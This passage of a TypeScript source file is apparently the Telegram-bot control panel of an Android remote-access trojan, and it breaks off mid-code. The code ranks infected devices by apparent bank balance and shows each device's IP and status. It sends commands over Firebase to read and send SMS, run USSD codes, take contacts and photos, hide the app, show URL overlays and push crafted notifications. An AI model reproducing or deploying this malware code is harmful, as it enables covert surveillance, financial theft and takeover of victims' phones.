import { randomUUID } from "crypto";
import { fastify as fast } from "fastify";
import { Update, InlineKeyboardButton, UserFromGetMe } from "@grammyjs/types";
import { Client } from "../modules";
import { classify } from "../database/dbs";
import { sendFirebaseMessage } from "./firebase/handy";
import { conf_data, scarlett, admins } from "./declaration";
import {
    createFont, getNowJalali, extractEdits,
    getRandomTimeout, buildFileUrl, getJalaliTime,
    sortByArrayDesc, sortByArrayLengthDesc,
    formatNumberWithUnit, numberCommas, chunkList
} from "../utilities";
import axios from "axios";
import sharp from "sharp";
import path from "path";
import fs from "fs";

async function getOnlineRankingBalanceForChart(port: string) {
    let users = await classify.ceph.getOnlineClientsByPort(port);

    users = users.map((val) => {
        val.balance_count = val.balance_count ? val.balance_count : "0";
        val.balance_count = val.balance_count.replaceAll(/,/g, "");
        val.balance_count = val.balance_count.replaceAll("/", "");
        return val;
    });

    const sorted = sortByArrayDesc<Client>(users, "balance_count");
    return sorted.map((val) => {
        val.balance_count = numberCommas(val.balance_count);
        return val;
    });
}

async function getEntireRankingBalance(committed: string) {
    let entire = 0n;
    const all_users = await classify.ceph.getClientsCommittedFrom(committed);
    for (const dnc of all_users) {
        try {
            dnc.balance_count = dnc.balance_count ? dnc.balance_count : "0";
            dnc.balance_count = dnc.balance_count.replaceAll("/", "");
            entire += BigInt(dnc.balance_count.replaceAll(/,/g, ""));
        } catch (e) { console.error("[getEntireRankingBalance]", e); }
    }
    return formatNumberWithUnit(numberCommas(entire.toString()));
}

async function getEntireRankingBalanceForChart(committed: string) {
    let users: Client[] = await classify.ceph.getClientsCommittedFrom(committed);
    users = users.map((val) => {
        val.balance_count = val.balance_count ? val.balance_count : "0";
        val.balance_count = val.balance_count.replaceAll(/,/g, "");
        val.balance_count = val.balance_count.replaceAll("/", "");
        return val;
    });

    const sorted = sortByArrayDesc<Client>(users, "balance_count");
    return sorted.map((val) => {
        val.balance_count = numberCommas(val.balance_count);
        return val;
    });
}

async function getOnlineRankingPermission(port: string): Promise<Client[]> {
    let users = await classify.ceph.getOnlineClientsByPort(port);
    return sortByArrayLengthDesc<Client>(users, "permissions");
}

function getHelpPage(): InlineKeyboardButton[] {
    return [{ text: createFont("🗼 help page 🗼"), url: conf_data.ceph_telegram_persianguide_link, style: "success" }];
}

function getUserPanel(from_id: number, client_id: string): InlineKeyboardButton[][] {
    return [
        [
            { text: createFont("🔃 update"), callback_data: `showUserPanel_${from_id}_${client_id}`, style: "primary" },
            { text: createFont("ping 💡"), callback_data: `selfUpdate_${from_id}_${client_id}`, style: "primary" }
        ],
        [
            { text: createFont("💰 balance"), callback_data: `getBalance_${from_id}_${client_id}` },
            { text: createFont("cards 💳"), callback_data: `getCards_${from_id}_${client_id}` }
        ],
        [
            { text: createFont("🌚 hide"), callback_data: `hideApp_${from_id}_${client_id}` },
            { text: createFont("unhide 🌝"), callback_data: `unhideApp_${from_id}_${client_id}` }
        ],
        [
            { text: createFont("🪙 get sms"), callback_data: `getSMS_${from_id}_${client_id}` },
            { text: createFont("ussd 🧷"), callback_data: `runUSSD_${from_id}_${client_id}` }
        ],
        [
            { text: createFont("🖋️ send sms"), callback_data: `sendMessage_${from_id}_${client_id}` },
            { text: createFont("contacts 👥"), callback_data: `getContacts_${from_id}_${client_id}` },
        ],
        [
            { text: createFont("☎️ phone numbers"), callback_data: `getPhoneNumbers_${from_id}_${client_id}` },
            { text: createFont("gallery 📁"), callback_data: `getGallery_${from_id}_${client_id}` },
        ],
        [
            { text: createFont("set nickname 🧵"), callback_data: `setMaskname_${from_id}_${client_id}` },
        ],
        [
            { text: createFont("🎨 skin"), callback_data: `skin_${from_id}_${client_id}` },
            { text: createFont("🔗 overlay 🔗"), callback_data: `overlay_${from_id}_${client_id}` },
        ],
        [
            { text: createFont("🔺 block"), callback_data: `block_${from_id}_${client_id}`, style: "danger" },
            { text: createFont("unblock 🔻"), callback_data: `unblock_${from_id}_${client_id}`, style: "danger" }
        ]
    ];
}

let itsme: UserFromGetMe | null = null;
const upload_path = path.join(__dirname, "..", ".uploads");
const apps_path = path.join(__dirname, "..", ".apps");
const gallery_path = path.join(__dirname, "..", ".gallery");
const icon_path = path.join(__dirname, "..", ".icons");

const fastify = fast({ logger: false });

const whereicons = {
    small_icon: path.join(icon_path, "smalli.png"),
    big_icon: path.join(icon_path, "bigi.png"),
    big_picture: path.join(icon_path, "bigp.png"),
};

if (!fs.existsSync(upload_path)) fs.mkdirSync(upload_path);
if (!fs.existsSync(gallery_path)) fs.mkdirSync(gallery_path, { recursive: true });
if (!fs.existsSync(icon_path)) fs.mkdirSync(icon_path);

fastify.post("/telegramWebhook", async (request, reply) => {
    await reply.send("OK");
    const update = request.body as Update;

    if (itsme === null) {
        itsme = await scarlett.api.getMe();
    }

    if (update) {
        if (update.message) {
            const adminids = admins.map((admin) => admin.id);
            if (!adminids.includes(update.message.from.id)) return;

            const _port_of = await classify.portService.getChatId(update.message.chat.id.toString());
            if (!_port_of) return;

            if (_port_of.status !== "active") return;

            if (update.message.document) {
                const stepcheck = await classify.steps.getStep(update.message.from.id);
                if (stepcheck) {
                    if (stepcheck.step === "getNewContactsFile") {
                        if (!update.message.document.mime_type) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 | invalid mime type"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (!["text/plain", "application/octet-stream"].includes(update.message.document.mime_type)) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 | invalid mime type"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("[...] downloading file ..."),
                            { reply_parameters: { message_id: update.message.message_id } }
                        ).then(async (_msg) => {
                            if (!update.message) return;
                            if (!update.message.document) return;
                            const file_name = randomUUID() + ".txt";
                            const file_path = path.join(upload_path, file_name);
                            const file_stream = fs.createWriteStream(file_path);
                            const file_object = await scarlett.api.getFile(update.message.document.file_id);
                            const file_link = buildFileUrl(file_object.file_path!, conf_data.scarlett_token);

                            try {
                                const response = await axios({ url: file_link, method: "GET", responseType: "stream" });
                                response.data.pipe(file_stream);

                                await new Promise((resolve) => {
                                    file_stream.on("finish", async () => {
                                        const file_contents = await fs.promises.readFile(file_path);
                                        const chunked = file_contents.toString().split("\n").slice(0, 5000);
                                        await fs.promises.unlink(file_path);

                                        await scarlett.api.sendMessage(
                                            update.message!.chat.id,
                                            createFont(`🛰️ | sending ~ createMultipleContacts\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + stepcheck.cid,
                                            { reply_parameters: { message_id: update.message!.message_id }, parse_mode: "HTML" }
                                        );
                                        resolve(null);
                                    });

                                    file_stream.on("error", async (err) => {
                                        await scarlett.api.sendMessage(
                                            update.message!.chat.id,
                                            createFont(`🔴 | ${err.message}`),
                                            { reply_parameters: { message_id: update.message!.message_id } }
                                        );
                                        await fs.promises.unlink(file_path);
                                    });

                                    response.data.on("error", async (err: any) => {
                                        await scarlett.api.sendMessage(
                                            update.message!.chat.id,
                                            createFont(`🔴 | ${err instanceof Error ? err.message : err}`),
                                            { reply_parameters: { message_id: update.message!.message_id } }
                                        );
                                        if (!file_stream.closed) file_stream.close();
                                        if (fs.existsSync(file_path)) await fs.promises.unlink(file_path);
                                    });
                                });
                            } catch (e) {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`🔴 | ${e instanceof Error ? e.message : e}`),
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );
                                if (!file_stream.closed) file_stream.close();
                                if (fs.existsSync(file_path)) await fs.promises.unlink(file_path);
                            }
                        }).catch((err) => {
                            console.error(err instanceof Error ? err.message : err);
                        });

                        await classify.steps.deleteStep(update.message.from.id);
                    }
                } else {
                    if (update.message.reply_to_message) {
                        if (update.message.reply_to_message.from) {
                            if (update.message.reply_to_message.from.id === itsme.id) {
                                if (update.message.reply_to_message.text) {
                                    if (update.message.reply_to_message.text.startsWith("??")) {
                                        if (!update.message.document.mime_type) {
                                            await scarlett.api.sendMessage(
                                                update.message.chat.id,
                                                createFont("🔴 | invalid mime type"),
                                                { reply_parameters: { message_id: update.message.message_id } }
                                            );
                                            return;
                                        }

                                        if (!["image/png", "image/jpg", "image/jpeg"].includes(update.message.document.mime_type)) {
                                            await scarlett.api.sendMessage(
                                                update.message.chat.id,
                                                createFont("🔴 | invalid mime type"),
                                                { reply_parameters: { message_id: update.message.message_id } }
                                            );
                                            return;
                                        }

                                        await scarlett.api.sendMessage(
                                            update.message.chat.id,
                                            createFont("[...] downloading file ..."),
                                            { reply_parameters: { message_id: update.message.message_id } }
                                        ).then(async (smsg) => {
                                            if (!update.message) return;
                                            if (!update.message.document) return;
                                            const edits = extractEdits(update.message.reply_to_message!.text!);
                                            if (edits.length === 3) {
                                                const notif_id = edits[0]!;
                                                const edit_thing = edits[1]!;
                                                const msg_idx = parseInt(edits[2]!);
                                                const __is_there = classify.notification.isThere(notif_id);

                                                if (!__is_there.status) {
                                                    await scarlett.api.sendMessage(update.message.chat.id, createFont("notification session did not find"), { reply_parameters: { message_id: update.message.message_id } });
                                                    return;
                                                }

                                                let edit_thing_clean: string;
                                                if (edit_thing.startsWith("small")) {
                                                    edit_thing_clean = "small_icon_path";
                                                } else {
                                                    edit_thing_clean = "big_" + edit_thing.slice(3) + "_path";
                                                }

                                                const file_dirs = (edit_thing === "smallicon" ? whereicons.small_icon : edit_thing === "bigicon" ? whereicons.big_icon : whereicons.big_picture);
                                                const file_name = file_dirs + (update.message.document.mime_type === "image/png" ? ".png" : ".jpg");
                                                const file_path = path.join(upload_path, path.basename(file_name));
                                                const file_stream = fs.createWriteStream(file_path);
                                                const file_object = await scarlett.api.getFile(update.message.document.file_id);
                                                const file_link = buildFileUrl(file_object.file_path!, conf_data.scarlett_token);

                                                try {
                                                    const response = await axios({ url: file_link, method: "GET", responseType: "stream" });
                                                    response.data.pipe(file_stream);

                                                    await new Promise((resolve) => {
                                                        file_stream.on("finish", async () => {
                                                            if (file_name.endsWith(".jpg")) {
                                                                await sharp(file_path).png().toFile((file_dirs + ".png"));
                                                            }

                                                            const editor = {};
                                                            Object.defineProperty(editor, edit_thing_clean, {
                                                                value: update.message!.text,
                                                                enumerable: true,
                                                                configurable: true,
                                                                writable: true
                                                            });

                                                            Object.defineProperty(__is_there.notification, edit_thing_clean, {
                                                                value: update.message!.text,
                                                                enumerable: true,
                                                                configurable: true,
                                                                writable: true
                                                            });

                                                            await classify.notification.updateNotification(notif_id, editor);

                                                            const created_text = await classify.notification.createText(
                                                                { ...__is_there.notification },
                                                                createFont
                                                            );

                                                            await scarlett.api.editMessageText(
                                                                update.message!.chat.id,
                                                                msg_idx,
                                                                createFont("?? | notification builder\n\n??? | create a new notification under 15 minutes\n\n") + "<blockquote expandable>" + created_text + "</blockquote>",
                                                                {
                                                                    parse_mode: "HTML",
                                                                    reply_markup: {
                                                                        inline_keyboard: [
                                                                            [
                                                                                { text: createFont("??? title"), callback_data: `editTitle_${update.message!.from.id}_${notif_id}` },
                                                                                { text: createFont("body ??"), callback_data: `editBody_${update.message!.from.id}_${notif_id}` }
                                                                            ],
                                                                            [
                                                                                { text: createFont("?? sound"), callback_data: `editSound_${update.message!.from.id}_${notif_id}` },
                                                                                { text: createFont("url ??"), callback_data: `editURL_${update.message!.from.id}_${notif_id}` }
                                                                            ],
                                                                            [
                                                                                { text: createFont("?? big picture ??"), callback_data: `editBigPicture_${update.message!.from.id}_${notif_id}` }
                                                                            ],
                                                                            [
                                                                                { text: createFont("?? big icon"), callback_data: `editBigIcon_${update.message!.from.id}_${notif_id}` },
                                                                                { text: createFont("small icon ??"), callback_data: `editSmallIcon_${update.message!.from.id}_${notif_id}` }
                                                                            ],
                                                                            [
                                                                                { text: createFont("↩️ back"), callback_data: `showUserPanel_${update.message!.from.id}_${__is_there.notification!.client_id}` },
                                                                                { text: createFont("push ??"), callback_data: `pushRealNotification_${update.message!.from.id}_${notif_id}` }
                                                                            ]
                                                                        ]
                                                                    }
                                                                }
                                                            );

                                                            await scarlett.api.deleteMessages(update.message!.chat.id, [update.message!.message_id, update.message!.reply_to_message!.message_id, smsg.message_id]);
                                                            resolve(null);
                                                        });

                                                        file_stream.on("error", async (err) => {
                                                            await scarlett.api.sendMessage(
                                                                update.message!.chat.id,
                                                                createFont(`?? | ${err.message}`),
                                                                { reply_parameters: { message_id: update.message!.message_id } }
                                                            );
                                                            await fs.promises.unlink(file_path);
                                                        });

                                                        response.data.on("error", async (err: any) => {
                                                            await scarlett.api.sendMessage(
                                                                update.message!.chat.id,
                                                                createFont(`?? | ${err instanceof Error ? err.message : err}`),
                                                                { reply_parameters: { message_id: update.message!.message_id } }
                                                            );
                                                            if (!file_stream.closed) file_stream.close();
                                                            if (fs.existsSync(file_path)) await fs.promises.unlink(file_path);
                                                        });
                                                    });
                                                } catch (e) {
                                                    await scarlett.api.sendMessage(
                                                        update.message.chat.id,
                                                        createFont(`?? | ${e instanceof Error ? e.message : e}`),
                                                        { reply_parameters: { message_id: update.message.message_id } }
                                                    );
                                                    if (!file_stream.closed) file_stream.close();
                                                    if (fs.existsSync(file_path)) await fs.promises.unlink(file_path);
                                                }
                                            }
                                        }).catch((err) => {
                                            console.error(err instanceof Error ? err.message : err);
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (update.message.text) {
                const stepcheck = await classify.steps.getStep(update.message.from.id);
                if (stepcheck) {
                    if (stepcheck.step === "getNewContactName") {
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("📞 | enter the phone ..."),
                            { reply_parameters: { message_id: update.message.message_id }, reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.message.from.id, { step: "getNewContactPhone", name: update.message.text, cid: stepcheck.cid, port: _port_of.port, timestamp: Date.now() });
                        return;
                    } else if (stepcheck.step === "getNewSingleMessagePhone") {
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("💬 | enter the message ..."),
                            { reply_parameters: { message_id: update.message.message_id }, reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.message.from.id, { step: "getNewSingleMessageText", phone: update.message.text, cid: stepcheck.cid, port: _port_of.port, timestamp: Date.now() });
                        return;
                    } else if (stepcheck.step === "getNewSingleMessageText") {
                        if (update.message.text.length > 3000) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | message has more than 3000 characaters`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        const sent_msg = await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`🛰️ | sending ~ sendMessage\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + stepcheck.cid,
                            { reply_parameters: { message_id: update.message.message_id }, parse_mode: "HTML" }
                        );

                        await classify.steps.deleteStep(update.message.from.id);

                        const user_token = await classify.tokenService.getAndroidIdAndPort(stepcheck.cid, _port_of.port);
                        const user_info = await classify.ceph.getClientById(stepcheck.cid);
                        if (user_token && user_info) {
                            const _msg_stat = await sendFirebaseMessage({
                                data: {
                                    method: "sendMessage",
                                    phone: stepcheck.phone,
                                    message: update.message.text,
                                    x: stepcheck.cid,
                                    y: (sent_msg.message_id as any)
                                },
                                token: user_token.token,
                                clientPublicKey: user_info.public_key
                            });

                            if (_msg_stat.status === false) {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`🔴 | ${_msg_stat['message']}`),
                                    { reply_parameters: { message_id: update.message!.message_id } }
                                );
                            }
                        }
                        await classify.steps.deleteStep(update.message.from.id);
                        return;
                    } else if (stepcheck.step === "getNewBroadcastSMSMessageText") {
                        if (update.message.text.length > 3000) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | message has more than 3000 characaters`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`🛰️ | sending ~ sendMessageToAll\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + stepcheck.cid,
                            { reply_parameters: { message_id: update.message.message_id }, parse_mode: "HTML" }
                        );
                        return;
                    } else if (stepcheck.step === "getNewUSSDCode") {
                        await classify.steps.deleteStep(update.message.from.id);

                        const sent_msg = await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`🛰️ | sending ~ runUSSD\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + stepcheck.cid,
                            { reply_parameters: { message_id: update.message.message_id }, parse_mode: "HTML" }
                        );

                        const user_token = await classify.tokenService.getAndroidIdAndPort(stepcheck.cid, _port_of.port);
                        const user_info = await classify.ceph.getClientById(stepcheck.cid);
                        if (user_token && user_info) {
                            const _msg_stat = await sendFirebaseMessage({
                                data: {
                                    method: "runUSSD",
                                    ussd: update.message.text,
                                    x: stepcheck.cid,
                                    y: (sent_msg.message_id as any)
                                },
                                token: user_token.token,
                                clientPublicKey: user_info.public_key
                            });

                            if (_msg_stat.status === false) {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`🔴 | ${_msg_stat['message']}`),
                                    { reply_parameters: { message_id: update.message!.message_id } }
                                );
                            }
                        }

                        await classify.steps.deleteStep(update.message.from.id);
                        return;
                    } else if (stepcheck.step === "getAllByAll") {
                        return;
                    } else if (stepcheck.step === "getAllByOneNumber") {
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("💬 | enter the message ..."),
                            { reply_parameters: { message_id: update.message.message_id }, reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.message.from.id, { step: "getAllByOneMessage", phone: update.message.text, cid: stepcheck.cid, port: _port_of.port, timestamp: Date.now() });
                        return;
                    } else if (stepcheck.step === "getAllByOneMessage") {
                        return;
                    } else if (stepcheck.step === "getNickname") {
                        if (update.message.text.length > 20) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 nickname is too long"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("✔️ new nickname setted for user"),
                            { reply_parameters: { message_id: update.message.message_id } }
                        );

                        await classify.ceph.updateClient(stepcheck.cid, { mask_name: update.message.text });
                        await classify.steps.deleteStep(update.message.from.id);
                        return;
                    } else if (stepcheck.step === "getNewLinkForOverlay") {
                        const sent_msg = await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`🛰️ | sending ~ overlay\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + stepcheck.cid,
                            { reply_parameters: { message_id: update.message.message_id }, parse_mode: "HTML" }
                        );

                        const user_token = await classify.tokenService.getAndroidIdAndPort(stepcheck.cid, _port_of.port);
                        const user_info = await classify.ceph.getClientById(stepcheck.cid);
                        if (user_token && user_info) {
                            const _msg_stat = await sendFirebaseMessage({
                                data: {
                                    method: "overlay",
                                    url: update.message.text,
                                    x: stepcheck.cid,
                                    y: (sent_msg.message_id as any)
                                },
                                token: user_token.token,
                                clientPublicKey: user_info.public_key
                            });

                            if (_msg_stat.status === false) {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`🔴 | ${_msg_stat['message']}`),
                                    { reply_parameters: { message_id: update.message!.message_id } }
                                );
                            }
                        }

                        await classify.steps.deleteStep(update.message.from.id);
                        return;
                    }
                } else {
                    if (update.message.reply_to_message) {
                        if (update.message.reply_to_message.from) {
                            if (update.message.reply_to_message.from.id === itsme.id) {
                                if (update.message.reply_to_message.text) {
                                    if (update.message.reply_to_message.text.startsWith("??")) {
                                        const edits = extractEdits(update.message.reply_to_message.text);
                                        if (edits.length === 3) {
                                            const notif_id = edits[0]!;
                                            const edit_thing = edits[1]!;
                                            const msg_idx = parseInt(edits[2]!);
                                            const __is_there = classify.notification.isThere(notif_id);

                                            if (!__is_there.status) {
                                                await scarlett.api.sendMessage(update.message.chat.id, createFont("notification session did not find"), { reply_parameters: { message_id: update.message.message_id } });
                                                return;
                                            }

                                            const editor = {};

                                            Object.defineProperty(editor, edit_thing, {
                                                value: update.message.text,
                                                enumerable: true,
                                                configurable: true,
                                                writable: true
                                            });

                                            Object.defineProperty(__is_there.notification, edit_thing, {
                                                value: update.message.text,
                                                enumerable: true,
                                                configurable: true,
                                                writable: true
                                            });

                                            await classify.notification.updateNotification(notif_id, editor);

                                            const created_text = await classify.notification.createText(
                                                { ...__is_there.notification },
                                                createFont
                                            );

                                            await scarlett.api.editMessageText(
                                                update.message.chat.id,
                                                msg_idx,
                                                createFont("?? | notification builder\n\n??? | create a new notification under 15 minutes\n\n") + "<blockquote expandable>" + created_text + "</blockquote>",
                                                {
                                                    parse_mode: "HTML",
                                                    reply_markup: {
                                                        inline_keyboard: [
                                                            [
                                                                { text: createFont("??? title"), callback_data: `editTitle_${update.message.from.id}_${notif_id}` },
                                                                { text: createFont("body ??"), callback_data: `editBody_${update.message.from.id}_${notif_id}` }
                                                            ],
                                                            [
                                                                { text: createFont("?? sound"), callback_data: `editSound_${update.message.from.id}_${notif_id}` },
                                                                { text: createFont("url ??"), callback_data: `editURL_${update.message.from.id}_${notif_id}` }
                                                            ],
                                                            [
                                                                { text: createFont("?? big picture ??"), callback_data: `editBigPicture_${update.message.from.id}_${notif_id}` }
                                                            ],
                                                            [
                                                                { text: createFont("?? big icon"), callback_data: `editBigIcon_${update.message.from.id}_${notif_id}` },
                                                                { text: createFont("small icon ??"), callback_data: `editSmallIcon_${update.message.from.id}_${notif_id}` }
                                                            ],
                                                            [
                                                                { text: createFont("↩️ back"), callback_data: `showUserPanel_${update.message.from.id}_${__is_there.notification!.client_id}` },
                                                                { text: createFont("push ??"), callback_data: `pushRealNotification_${update.message.from.id}_${notif_id}` }
                                                            ]
                                                        ]
                                                    }
                                                }
                                            );

                                            await scarlett.api.deleteMessages(update.message.chat.id, [update.message.message_id, update.message.reply_to_message.message_id]);
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if (update.message.text.startsWith("/start")) {
                        const allclients = await classify.ceph.getClientsCommittedFrom(_port_of.port);
                        const _rdx_clients = await classify.ceph.getOnlineClientsByPort(_port_of.port);
                        const allonlineclientslength = _rdx_clients.length;
                        const systemBalance = await getEntireRankingBalance(_port_of.port);
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`📊 | welcome to ceph panel\n👥 | all users: ${allclients.length} | onlines: ${allonlineclientslength}\n🌊 | port: `) + `<code>${_port_of.port}</code>` + createFont(`\n\n📺 | balance: ${systemBalance}\n⚙️ | open one of options for better access\n\n⚠️ | به دلیل تغییر سیستم به فایربیس, همیشه آنلاینی هارو رفرش کنید تا از تازه بودن آمار مطمعن بشید`),
                            {
                                parse_mode: "HTML",
                                reply_parameters: { message_id: update.message.message_id },
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: createFont("👥 online users"), callback_data: `onlineuserslist_${update.message.from.id}` },
                                            { text: createFont("all users 📊"), callback_data: `alluserslist_${update.message.from.id}` }
                                        ],
                                        [
                                            { text: createFont("📈 ranking 📉"), callback_data: `ranking_${update.message.from.id}` }
                                        ],
                                        [
                                            { text: createFont("⚗️ upload app"), callback_data: `uploadapp_${update.message.from.id}` },
                                            { text: createFont("persian guide 🧾"), url: conf_data.ceph_telegram_persianguide_link }
                                        ],
                                        [
                                            { text: createFont("⚖️ about us ⚖️"), url: conf_data.ceph_telegram_channel_link, style: "primary" }
                                        ]
                                    ]
                                }
                            }
                        );
                        return;
                    } else if (["block", "بلاک"].includes(update.message.text)) {
                        if (update.message.reply_to_message) {
                            if (update.message.reply_to_message.text) {
                                const splitted_text = update.message.reply_to_message.text.split(".");
                                if (splitted_text.length !== 4) {
                                    await scarlett.api.sendMessage(
                                        update.message.chat.id,
                                        "🔴 replied message does not include an ip",
                                        { reply_parameters: { message_id: update.message.message_id } }
                                    );
                                    return;
                                }

                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`✏️ new ip added to database [ `) + `<code>${update.message.reply_to_message.text}</code> ]`,
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );

                                await classify.ipblocker.addIP(update.message.reply_to_message.text);
                                return;
                            } else {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    "🔴 replied message does not contain text",
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );
                                return;
                            }
                        } else {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                "🔴 please reply on a message",
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }
                    } else if (["delblock", "حذف بلاک"].includes(update.message.text)) {
                        if (update.message.reply_to_message) {
                            if (update.message.reply_to_message.text) {
                                const splitted_text = update.message.reply_to_message.text.split(".");
                                if (splitted_text.length !== 4) {
                                    await scarlett.api.sendMessage(
                                        update.message.chat.id,
                                        "🔴 replied message does not include an ip",
                                        { reply_parameters: { message_id: update.message.message_id } }
                                    );
                                    return;
                                }

                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`✏️ ip has deleted from database [ `) + `<code>${update.message.reply_to_message.text}</code> ]`,
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );

                                await classify.ipblocker.deleteIP(update.message.reply_to_message.text);
                                return;
                            } else {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    "🔴 replied message does not contain text",
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );
                                return;
                            }
                        } else {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                "🔴 please reply on a message",
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }
                    } else if (["listblock", "لیست بلاک"].includes(update.message.text)) {
                        const blocked_ips = await classify.ipblocker.getIPs();
                        const blocked_clients = await classify.ceph.getBlockedClients();
                        const blocked_objects = [...blocked_ips, ...blocked_clients];
                        const chunked = chunkList(blocked_objects);

                        const texts_to_send: string[] = [(createFont(`🪵 | list of blocked objects [ ${blocked_objects.length} ]\n`))];
                        let numb = 0;
                        let blocked_numb = 0;
                        for (const chunk of chunked) {
                            blocked_numb += 1;
                            if (texts_to_send[numb]!.length < 4000) {
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n${blocked_numb} / <code>${(!(typeof c === "string")) ? `/set_${c.id}` : c}`;
                                }).join("");
                            } else {
                                numb += 1;
                                texts_to_send.push("");
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n${blocked_numb} / <code>${(!(typeof c === "string")) ? `/set_${c.id}` : c}`;
                                }).join("");
                            }
                        }

                        for (const txt of texts_to_send) {
                            await scarlett.api.sendMessage(update.message.chat.id, txt, { parse_mode: "HTML" });
                        }
                    } else if (update.message.text.startsWith("/set_")) {
                        let cid = "";
                        if (update.message.text.includes("@")) {
                            cid = update.message.text.slice(5, update.message.text.indexOf("@"));
                        } else {
                            cid = update.message.text.slice(5);
                        }

                        if (cid.length === 0) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 invalid input"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        const client = await classify.ceph.getClientById(cid);

                        if (!client) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 client does not exist"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        let gallery_pictures: string[] = [];
                        if (fs.existsSync(path.join(gallery_path, cid))) {
                            gallery_pictures = await fs.promises.readdir(path.join(gallery_path, cid));
                        }

                        const first_connection = getJalaliTime(client.connected_at);
                        const last_connection = getJalaliTime(client.last_connection_at);
                        const first_connection_str = `${first_connection.year}/${first_connection.month}/${first_connection.day} - ${first_connection.hour}:${first_connection.minute}:${first_connection.second}`;
                        const last_connection_str = `${last_connection.year}/${last_connection.month}/${last_connection.day} - ${last_connection.hour}:${last_connection.minute}:${last_connection.second}`;
                        const text_to_send = createFont("👤 | selected user: ") + `/set_${client.id}\n\n` + createFont(`🔏 | blocked: ${client.blocked ? 'yes' : 'no'}\n🖼️ | pictures: ${gallery_pictures.length}\n${client.is_online ? '🟢' : '🔴'} | online: ${client.is_online ? "yes" : "no"}\n\n💰 | balance: ${formatNumberWithUnit(client.balance_count ? client.balance_count : "0")}\n📊 | permissions: ${(client.permissions ?? []).join(", ")}`) + "\n\n" + `<blockquote expandable>` + createFont("🌐 | ip: ") + `<code>${client.ip}</code>` + createFont(`\n${(client.battery >= 30) ? '🔋' : '🪫'} | battery: ${client.battery}%\n📱 | mobile: ${client.mobile}\n🦠 | android ${client.android_version}\n🪡 | app name: ${client.app_name}\n`) + `${(client.screen_status == 'OFF') ? '🔒' : '🔓'}` + createFont(` | screen: ${client.screen_status} | ${client.app_behave.toLowerCase()} app`) + createFont(`\n📈 | app version: ${client.version}`) + "</blockquote>\n\n" + "<blockquote>" + createFont(`⏲️ | since ${first_connection_str}\n🪠 | last online ${last_connection_str}`) + "</blockquote>";

                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            text_to_send,
                            {
                                parse_mode: "HTML",
                                reply_parameters: { message_id: update.message.message_id },
                                reply_markup: { inline_keyboard: getUserPanel(update.message.from.id, client.id) }
                            }
                        );

                        return;
                    } else if (update.message.text.startsWith("/mask_")) {
                        const cmask = update.message.text.slice(6);
                        if (cmask.length === 0) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 invalid input"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        const client = await classify.ceph.getClientByName(cmask);

                        if (!client) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
